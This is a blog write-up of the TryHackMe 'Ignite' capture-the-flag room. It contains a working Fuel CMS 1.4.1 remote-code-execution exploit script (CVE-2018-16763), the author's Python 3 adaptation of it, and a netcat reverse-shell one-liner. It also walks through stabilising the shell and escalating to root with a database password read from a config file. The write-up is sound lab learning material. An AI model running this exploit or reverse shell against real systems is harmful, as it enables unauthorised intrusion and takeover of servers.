---
title: "THM: Ignite"
date: 2023-12-24 19:29:07
categories:
    - TryHackMe
tags:
    - TryHackMe
    - Linux
    - CVE
    - Reverse Shell
    - Privilege Escalation
    - Python
---

# Introduction

This is a writeup for the room [Ignite](https://tryhackme.com/room/ignite) on TryHackMe. Ignite is a beginner level room that focuses on Linux exploitation.

> Ignite | A new start-up has a few issues with their web server.

This was a more unique room, with an actual CVE exploit that was used. It included quite a bit of things that I just learnt, with a little bit of tweaks here and there.

# Enumeration

## Nmap

Starting off with _yet another_ usual nmap scan:

```bash
nmap -sC -sV <ip>
```

The results were:

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-24 19:28 +08
Nmap scan report for <ip>
Host is up (0.36s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry
|_/fuel/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.80 seconds
```

This shows that there was a webserver running on port 80. Hey! Fuel CMS. Came across CMSes in the previous room.

## Webserver

Going to the webserver, we see this:

![Image](./img/ignite/fuelcms.png)

From this, we can see a few things:

1. It is indeed running Fuel CMS, and is on version 1.4
2. There is a database configuration found in `/fuel/application/config/database.php` and other configuration files in `/fuel/application/config/`
3. There is a `/fuel` directory, with credentials admin:admin.

### /fuel

Using the credentials, we can login to the `/fuel` directory.

![Image](./img/ignite/fuel.png)

After a bit of poking around, I didn't manage to find anything useful. I then took to Google-ing for things related to Fuel CMS. I then came across `ExploitDB` and found a [Fuel CMS 1.4.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47138) exploit.

# Exploit

The exploit was a Python script:

```python
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

import requests
import urllib

url = "http://127.0.0.1:8881"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url, proxies=proxy)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]
```

This exploit allowed for remote code execution (RCE), which is a vulnerability that allows an attacker to execute commands on the server.

Looking at this code, it seems to be an interactive shell that sends requests to the server by injecting payloads into the URL.

I then modified the code to suit my needs:

```python
import requests
import urllib
from urllib.parse import quote

url = "http://<ip>"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
	#proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print(r.text[0:dup])
```

What I did was to change some of the code to suit Python 3, and removed the proxy.

Now, we can test it out using

```bash
python3 exploit.py
```

Once there is a successful connection (seen by the `cmd:` prompt), we can try out some commands.

![execution](./img/ignite/execution.png)

It seems to be working well! It seemed to be spitting out some PHP errors, but above that, we can see that the commands are being executed properly.

But, we can't do much with this, as we are in a limited, non-interactive shell. Thus, the next step is to get a reverse shell.

# Reverse Shell

I didn't want to us a clunky reverse shell, so I went to a [Reverse Shell Generator](https://www.revshells.com/) to generate one that I could connect to using `netcat`.

I used this payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ip> 1234 >/tmp/f`

I then got my netcat listener ready (`nc -lvnp 1234`), can executed the payload with the Python script.

Once I got the reverse shell, I upgraded it so that commands like `su`, `sudo` and `CTRL+C` would work.

![stabilise](./img/ignite/stabilise.png)

To make things clearer, what I did was to:

1. Run `python3 -c 'import pty;pty.spawn("/bin/bash")'` to upgrade the shell
2. Run `CTRL+Z` to background the shell, returning control to my terminal
3. Run `stty raw -echo; fg` to make the shell usable again, changing the terminal settings to raw (having the input sent directly without any processing like line editing), and disabling echo (so that the input is not double printed on the screen). Then, I brought the shell back to the foreground.
4. Run `ls` to ensure that the shell is working properly

Now, we have a stable reverse shell.

# Getting Flags

## User Flag

I first had to locate the user flag. I did this by running

```bash
find / -name user.txt 2>/dev/null
/home/www-data/user.txt
```

as usual, to find the file. I then navigated to the directory and read the flag.

![userflag](./img/ignite/userflag.png)

One flag down!

## Root Flag

This is where it gets more difficult. I had to find a way to escalate my privileges to root. I tried to run `su`, but because I didn't know the password, I didn't mess around with it.

There was still the configuration files that I hadn't explored earlier. On the webserver, I tried to access `/fuel/application/config/database.php`, but was met with a forbidden error.

![forbidden](./img/ignite/database_web.png)

Going back to the reverse shell, I navigated to the directory and found the file in `/var/www/html/fuel/application/config/database.php`. I then read the file the same way.

![db](./img/ignite/db.png)

It was quite a bit of information, so I filtered it out using `| grep password` to find the password and we got it!!

![password](./img/ignite/greppw.png)

We are almost there. Now, we can run `su` and enter the password to get root access. I then tried to locate the root flag in the same way:

```bash
find / -name root.txt 2>/dev/null
/root/root.txt
```

Next, I read the flag:
![rootflag](./img/ignite/rootflag.png)

# Conclusion

In all, I thoroughly enjoyed this room; putting my knowledge that I learnt through the previous rooms to the test. It was also pretty cool to see an actual CVE exploit being used! There were lots of unexpected challenges, especially with the exploit requiring a bit of tweaking in the code to get it to work. Regardless, I learnt a lot from this room. :D
